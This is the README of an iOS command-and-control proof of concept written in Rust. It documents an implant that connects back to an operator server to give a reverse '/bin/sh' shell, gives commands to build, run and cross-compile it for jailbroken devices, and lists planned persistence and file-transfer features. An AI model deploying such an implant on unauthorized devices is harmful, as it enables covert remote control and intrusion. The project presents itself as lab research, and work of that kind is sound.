# Ravenna

[![Rust](https://img.shields.io/badge/rust-1.70%2B-blue.svg)](https://www.rust-lang.org/)

> **⚠️ Legal Notice:** This project is for **authorized security research and education only**. Use only on devices and
> networks you own or have explicit written permission to test. Misuse may violate laws such as the CFAA (US) or EU
> Cybercrime Directive. The authors accept **no liability** for misuse.

## Overview

Ravenna is a iOS command-and-control (C2) proof-of-concept designed for studying implant/operator architecture
in controlled lab environments. Built entirely in Rust using POSIX sockets and Protocol Buffers, it avoids Swift
dependencies to maximize portability.

**Design Principles:**

- **Transparency:** Clear, auditable code for educational purposes.
- **Lab-Scoped:** Intended solely for authorized testing on owned devices.

## Features

### Implemented

- [x] Reverse shell (`/bin/sh` over plaintext TCP + protobuf framing)
- [x] Cross-compilation support for AArch64 iOS targets

### Planned

- [ ] TLS encryption for secure communication
- [ ] Implant authentication and enrollment protocol
- [ ] File upload/download capabilities
- [ ] `launchd` plist integration for jailbroken devices

## Prerequisites

- Rust 1.70+ ([install](https://rustup.rs/))
- Protocol Buffers compiler (`protoc`)
- For iOS builds: Xcode Command Line Tools, jailbroken iOS device

## Quick Start

### 1. Clone and Build

```sh
git clone https://github.com/yourusername/ravenna.git
cd ravenna
cargo build --release
```

### 2. Run Server (Operator)

```sh
cargo run --bin server -- 0.0.0.0 8080
```

### 3. Run Implant (Target)

```sh
# On macOS/Linux host for testing
cargo run --bin implant -- 127.0.0.1 8080

# Cross-compile for jailbroken iOS device
rustup target add aarch64-apple-ios
cargo build --target aarch64-apple-ios --bin implant --release
# Transfer binary to device and execute
```

## Architecture

- Server: Listens for incoming connections, manages sessions.
- Implant: Connects back to server, provides shell access.
- Protocol: Protobuf-framed messages over raw TCP sockets.

## Acknowledgments

Inspired by academic research on C2 architectures.